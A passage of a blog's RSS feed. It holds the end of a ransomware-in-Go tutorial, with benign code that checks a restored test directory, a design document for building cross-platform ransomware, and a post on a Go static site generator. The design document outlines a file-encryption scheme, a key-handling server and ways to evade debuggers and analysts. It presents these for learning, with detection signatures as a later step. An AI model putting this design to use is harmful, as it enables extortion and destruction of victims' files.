<p>It&rsquo;s all stuff we saw in the last section. We&rsquo;re being tricky with our paths, since we&rsquo;re walking <code>_victim/</code> and checking in on <code>victim/</code> we just need to drop the underscore off the front to get the corresponding file that we are verfiying. That&rsquo;s done with the subslice notation <code>[1:]</code>, going from the first character (the one after the zeroth) to the end.</p>

<pre><code class="language-golang">func onVisit(path string, fi os.FileInfo, err error) error {
	if fi.IsDir() {
		return nil
	}

	// Read original.
	bsOrig, err := ioutil.ReadFile(path)
	if err != nil {
		log.Println(&quot;Error reading&quot;, path)
		log.Println(err)
		return nil
	}

	hashOrig := sha256.Sum256(bsOrig)

	// Read copy.
	bsCopy, err := ioutil.ReadFile(path[1:])
	if err != nil {
		log.Println(&quot;Error reading&quot;, path[1:])
		log.Println(err)
		return nil
	}

	hashCopy := sha256.Sum256(bsCopy)

	// Report mismatches.
	if hashOrig != hashCopy {
		log.Println(&quot;Mismatch for&quot;, path)
	}

	return nil
}
</code></pre>

<p>Give ol&rsquo; <code>util/util.go</code> a run with <code>-verify</code> now and see how it does. It probably won&rsquo;t be too interesting unless you go and edit a file in the clone directory. You can also try deleting a file and see how that gets handled. Afterall, we don&rsquo;t want our ransomware losing people&rsquo;s data all willy nilly.</p>

<h2>Conclusion</h2>

<p>We have a decent setup for restoring our <code>victim/</code> directory now, we can also check that the files line up between the original and the copy.</p>

<p>Up next in the series we&rsquo;ll get to generating our server keypair, and we&rsquo;ll write a couple scratch programs to understand how to use the encryption packages. That will set us up nicely to write the encryptor in Part 3.</p>

<p>Keep on hacking on!</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Mon, 09 Nov 2020 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Design Doc - Ransomware in Golang Part 0</title>
      <link>https://tacix.at/posts/Design Doc - Ransomware in Golang Part 0.html</link>
      <description>Go ransomware design document...</description>
      <content:encoded><![CDATA[<p>We’re going to build some ransomware. This document covers the high level design and a few details to get us started. We’ll be using an asymmetric + symmetric encryption scheme for locking files. We’ll also build a server for handling decryption. All of this will be written in Go, so it will be cross platform. Our malware will show off Go’s great parallelization and networking capabilities. From there we’ll get into the technical details and start looking at anti-analysis tricks and signature writing. I’ll take you through everything step by step.</p>

<h2>Design</h2>

<h3>Encryptor</h3>

<p>The encryptor is the malware sample that gets dropped on the victim’s computer. It will use a common asymmetric + symmetric encryption scheme for encrypting files. It will walk directories, visiting each file. It will selectively target certain files based on mimetype, extension, or size.
Encryption Scheme</p>

<p>The server will have an asymmetric keypair (e.g. RSA). The server private key will be kept private on the server. The server public key will be embedded in the encryptor client. When the client runs it will generate a client keypair and encrypt the private key with the server’s public key. For each file, it will generate a random symmetric key (e.g. AES). That file key will be used to encrypt the file contents, then that key will be encrypted with the client’s public key and stored. We will also store the IV and number of padding bytes for each file.</p>

<pre><code class="language-golang">type EncryptionInfo struct {
	Path    string
	Padding uint8
	Key     []byte
	Iv      []byte
} 
</code></pre>

<p>This allows the server to unlock a machine by decrypting the single client private key. That client key and be used to decrypt each file key, and each file key, in turn, can be used to decrypt its respective file.</p>

<h3>File Walking</h3>

<p>This will be incredibly simple. The Go package path/filepath includes a method Walk. We’ll implement the visitor function to handle each file. This is where we can add filtering to not target files that are too large or an unknown file type. For detecting file types we will either use mimetype or http.DetectContentType.
Server</p>

<p>The server will be a standard HTTP server in Golang. These are super easy to write. We’ll look at HTML templating for the front-end portion of the site. This will have a few support methods for the client.</p>

<p>While the client won’t always have a network connection, when it does we will upload the encrypted key to the server to save the user from having to. For this we’ll have some endpoint like /storeKey. The front-end will need an endpoint to trigger decryption, something like /decrypt, where it can post the user’s key file (or the simple code in place of the file) and get back the decryptor.</p>

<h2>Milestones</h2>

<h3>Environment</h3>

<p>This is where we will get set up. Right now I think it will just be installing Go, which is incredibly straight forward. You will also learn about the project layout and any other information that will be helpful pre-code.</p>

<h3>Victim directory setup</h3>

<p>I’ll be working on the computer I use daily as I’m sure many of you will too. Since we do not want to be encrypting our disks before we have written a decryptor, we’ll write a program to set up a victim directory. If the directory currently exists it will remove it, then it will copy in a directory structure we have established elsewhere on disk. We’ll be running our encryptor repeatedly while debugging it, this will allow an easy set up and tear down of the test directory.</p>

<h3>Key generator</h3>

<p>Following the <a href="https://medium.com/@tarcisioma/ransomware-encryption-techniques-696531d07bb9">standard ransomware encryption scheme</a>, we’ll need a master key pair for the server to use. We’ll dive more into encryption later, but the short of it is we will be using AES (symmetric) to encrypt the files, we’ll encrypt those keys with an asymmetric client keypair. The private key of the client keypair will be encrypted by the server keypair’s public key. In this milestone we will write a program that generates the server keypair, saves it to disk, and prints out the public key in a code-friendly format for our encryptor client.</p>

<h3>Encryptor</h3>

<p>We finally get to write our ransomware client! Here we’ll start with building blocks of the client, such as asymmetric and symmetric cryptography and walking a directory structure. Then we will combine these pieces into a simple but functional prototype that will get refined throughout the rest of the series.</p>

<h3>Server and key decryption</h3>

<p>The encryptor needs a server that takes payment (ours won’t, see: Not Covered) and returns a decrypted client key. Here we’ll learn about writing web servers in Go and HTML templating. Rather than running a separate application like Apache, we can get a webserver up and running with just Go code. We will then expand on this for better usability. For example, most users will not have the technical skills to find and upload the key file, so our encryptor client should do it for them when it has network connectivity.</p>

<h3>File decryption</h3>

<p>Since you have the encryptor written, this should be fairly straight forward. We just need to flip the encryption methods to be decryption methods using the same directory walking. Once this is done you’ll have an end-to-end functional prototype. Another usability improvement will be to patch the decrypted key into a pre-built decryptor. This way the user does not need to manage two separate files.</p>

<h3>Anti-analysis</h3>

<p>A lot of anti-analysis techniques are OS specific. Since we are building cross-platform malware there is a limit to what can be implemented. What is possible is process enumeration. Malware tends to check for known analysis programs (debuggers, network capturing tools, etc.) and can either decide to kill them, not run, or do something else entirely. We’ll explore a few of these options.</p>

<p>Another anti-analysis option we have in Go is to do timing checks. If the process is being stepped through in a debugger, the execution will be much slower than it normally would. We can capture a start time then an end time at some other point and check that the difference is within some threshold of our normal measurement.</p>

<h3>Parsing debug information</h3>

<p>Next we will take an analysis point of view and see how much information we can recover form our Go binary. We will explore the debug information and the executable file format (either ELF or PE) by reimplementing the work done in this awesome blog post. We’ll also explore ways to ruin these helpful debug hints.</p>

<h3>Signature coverage</h3>

<p>In this milestone we will take a defensive posture by writing ClamAV and YARA signatures for our ransomware. We will start by looking at hash based signatures and see why they suck. Next we’ll move onto real signature writing strategies, getting byte based coverage.</p>

<h2>Not Covered (yet)</h2>

<h3>Accepting payments</h3>

<p>Payments aren’t covered for 2 reasons. The first being I don’t want to provide some ready-to-go malware package for people to ruin their lives with. The other is that it is actually a pretty large topic that I’ll cover in the future when we set up a darknet e-commerce shop.</p>

<h3>OS specific techniques</h3>

<p>A lot of anti-analysis techniques are OS specific. We won’t be covering those here. We’ll work on some OS specific implants at a way later date. Right now we’re going to skip manually loading our libraries and injecting into other processes. This allows our malware to be cross platform, which is great since 2020 is the year of the Linux desktop.</p>

<h3>Opsec</h3>

<p>Opsec is antithetical to operational efficiency. We’d spend much more time on protecting our anonymity than writing this ransomware. We don’t need to spend $50 dollars on a burner, worry about buying our hosting services with untraceable Bitcoin, or figure out how to bootstrap an email account over Tor so you can purchase a VPN. I’ve written about some orthogonal topics it in the past and it’s not easy.</p>

<h3>Infection</h3>

<p>My dad got infected with Sigma ransomware from a response to his Craigslist casual encounters post (jk, it was a job ad). Word documents with macros are a common infection vector. In the same spirit of not providing a fully weaponized system, that will not be covered in this series.</p>

<h2>Conclusion</h2>

<p>This should be really fun. I’ve had fun prototyping it and you’ll have a blast and learn a lot running through it. I also have a ton of great topics planned once we’re done.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Fri, 06 Nov 2020 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Writing my own static site generator</title>
      <link>https://tacix.at/posts/Writing my own static site generator.html</link>
      <description>Writing a simple static site generate in Golang to avoid learning Jekyll...</description>
      <content:encoded><![CDATA[<p>Hey, first post! I wanted to set up a blog to track the things that I work on. I figured you can&rsquo;t beat free, so I set up GitHub Pages. Jekyll is the default for Pages, so I dove in to check it out. I could not really figure out a minimal example. Do I just clone in an entire theme to my repo and start working from there? What are all these directories? I need to install Ruby? Figured I could write one in ~100 lines of code, so I set off.</p>

<h2>Golang</h2>

<p>I ended up clocking in about ~150 lines for my main file, which I thought would be the heart of the code. The main idea is loop over some markdown posts, md -&gt; html using <a href="https://github.com/russross/blackfriday">Blackfriday</a>, then generate the index from the posts.</p>

<pre><code class="language-go">func main() {
	id := &amp;IndexData{
		Posts: []PostData{},
	}

	genPosts(id)

	writeTemplate(
		[]string{
			&quot;_templates/index.gohtml&quot;,
			&quot;_templates/base.gohtml&quot;,
		}, &quot;index.html&quot;, id)

	genAbout()
}
</code></pre>

<p>Since the heart of things is the <code>genPosts</code> function, we&rsquo;ll look at that. The first block is listing out the markdown files in the <code>_posts</code> folder. Then we kick it off looping over those and generating an HTML file for each.</p>

<pre><code class="language-go">files, err := ioutil.ReadDir(&quot;_posts&quot;)
if err != nil {
	log.Fatal(err)
}

for _, f := range files {
	// ...
}
</code></pre>

<p>In our for loop, the first step is reading the file in, which is pretty straight forward Go code.</p>

<pre><code class="language-go">	md, err := ioutil.ReadFile(&quot;_posts/&quot; + f.Name())
	if err != nil {
		log.Println(err)
		continue
	}
</code></pre>

<p>Now I jumped right into rendering the markdown using Blackfriday and I kept getting awful parser errors. I was seriously wondering how such a buggy repo could have so many stars! It was user error though. I&rsquo;m on a Windows host, and the <code>\r\n</code> is apparently not handled by Blackfriday! This was the most time consuming thing of the project. That gives us this beautiful function which is just a <code>bytes.Replace()</code>.</p>

<pre><code class="language-go">	md = windowsBad(md)
</code></pre>

<p>In my review of SSGs I noticed they all had some metadata at the top of the file. This is called <em>Front Matter</em>. It seemed simple enough, you have some JSON, YAML, or TOML followed by a delimeter. I chose TOML since I had never used it before. I have a strange affinity for JSON but it is kinda a pain to write. I chose the delimiter <code>---</code>.</p>

<p>Simply split on that, grab the chunk before and treat it as TOML, rejoin the chunk after and treat it as markdown.</p>

<pre><code class="language-go">	s := bytes.Split(md, []byte(&quot;\n---\n&quot;))
	if len(s) &lt; 2 {
		log.Println(&quot;Missing post metadata.&quot;)
		continue
	}
	md = bytes.Join(s[1:], []byte(&quot;\n---\n&quot;))

	var pd PostData
	_, err = toml.Decode(string(s[0]), &amp;pd)
	if err != nil {
		log.Println(err)
		continue
	}
</code></pre>

<p>The TOML reads right into the <code>PostData</code> struct. We have a post title and a date. The tags aren&rsquo;t used right now, but it should be easy enough to whip up some JS for filtering, or individual pages for each tag. The field <code>Raw</code> is where the markdown rendered to HTML goes.</p>

<pre><code class="language-go">type PostData struct {
	Title string
	Tags  []string
	Date  time.Time
	Raw   template.HTML
}
</code></pre>

<p>After that we render and pass <code>PostData</code> to our templates. Then we append the post to the <code>IndexData</code> structure we passed in so we can go back and write out the index.</p>

<pre><code class="language-go">	cr := NewChromaRenderer(
		ChromaOptions(html.TabWidth(4)))
	pd.Raw = template.HTML(blackfriday.Run(
		md, blackfriday.WithRenderer(cr)))
	writeTemplate(
		[]string{
			&quot;_templates/post.gohtml&quot;,
			&quot;_templates/base.gohtml&quot;,
		}, fmt.Sprintf(&quot;posts/%s.html&quot;, pd.Title), pd)
	id.Posts = append(id.Posts, pd)
</code></pre>

<p>The function <code>writeTemplate</code> is just a convenience wrapper I made for executing templates then writing them to a file. Now that I&rsquo;m writing this I see I should probably check the error that it returns.</p>

<pre><code class="language-go">func writeTemplate(t []string, o string, d interface{}) error {
	it, err := template.ParseFiles(t...)
	if err != nil {
		return err
	}

	f, err := os.Create(o)
	if err != nil {
		return err
	}
	defer f.Close()

	return it.ExecuteTemplate(f, &quot;base.gohtml&quot;, d)
}
</code></pre>

<p>I skipped over the <code>NewChromaRenderer</code> above. There is a really nice library called <a href="https://github.com/Depado/bfchroma">bfchroma</a> that adds syntax highlighting support to Blackfriday (amazing!). It doesn&rsquo;t load though.</p>

<p>Blackfriday got cute with their packaging and are hosting it on <code>gopkg.in</code>. I had not really seen this before, but it seems like it knocked a lot of things out of sync. Some places are importing <code>github.com/russross/blackfriday/v2</code>. The repo tells you to <code>go get gopkg.in/russross/blackfriday.v2</code> though, and import that same URL. When installing bfchroma you can an error that it can&rsquo;t find that <code>github.com</code> URL.</p>

<p>I tried forking the repo and swapping out all the URLs for the <code>gopkg.in</code> one, but something with the module wanted to store it there but import from <code>github.com</code>. It was a mess, I don&rsquo;t know if it was on my end or the packages&rsquo;. I just ended up grabbing the one file from <code>bfchroma</code>, doing some small modifications, and hosting it in this repo.</p>

<h2>Templates</h2>

<p>I learned a bit in this project, one of the things I had never touched before was nesting Go templates. I created a base template for the whole site, then define a few sub templates that get jammed in there. The following is out of <code>base.gohtml</code>.</p>

<pre><code class="language-go-html-template">&lt;body&gt;
  &lt;header&gt;
    &lt;span id=title&gt;&lt;a href=/&gt;TACIX.AT&lt;/a&gt;&lt;/span&gt;
    &lt;span id=about&gt;&lt;a href=/about&gt;About&lt;/a&gt;&lt;/span&gt;
  &lt;/header&gt;

  &lt;div id=main&gt;
  {{ template &quot;main&quot; . }}
  &lt;/div&gt;

  &lt;footer&gt;
  &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>Then in the specific template, e.g. <code>index.gohtml</code> we can just define <code>main</code>.</p>

<pre><code class="language-go-html-template">{{ define &quot;main&quot; }}
  {{ range $p := .Posts }}
    &lt;div class=entry&gt;
      &lt;div class=date&gt;{{ $p.Datef }}&lt;/div&gt;
      &lt;div class=post&gt;
      	&lt;a href=&quot;/posts/{{ $p.Title }}.html&quot;&gt;{{ $p.Title }}&lt;/a&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  {{ end }}
{{ end }}
</code></pre>

<p>The <code>writeTemplate</code> function above handles loading multiple templates and then executing from <code>base.gohtml</code>. Neat! I also have one for injecting CSS. In the future when I make some more interactive blogs I will add one for JavaScript.</p>

<h2>Conclusion</h2>

<p>This took me about a day of programming with a nice break in the middle to take the dog to the dog park with the girlfriend and see the bats in Austin. I really feel setting up a standard static site generator would have taken as long. The base code is easy enough, the big time sink was styling the blog! I think that is the win with existing SSGs, having prebuilt themes. I shouldn&rsquo;t lie to myself though, I would have definitely taken as long tweaking a prebuilt theme as I did doing my own.</p>

<p>I do like doing things this way. This gives me a base to build future projects off of. I have a static site generator now that I fully understand and can easily add features to. A thought that came to mind with this, it would be pretty easy to take this tech and make a technical-focused markdown-based blogging site. Now if I ever want to build that up, I have a great starting point.</p>

<p>All the <a href="https://github.com/TACIXAT/tacixat.github.io">code</a> is public so feel free to take a look! The Go code is in <code>_sssg</code> (the extra <code>s</code> was for <em>simple</em>).</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Mon, 18 May 2020 13:37:00 -0400</pubDate>
    </item>
  </channel>
</rss>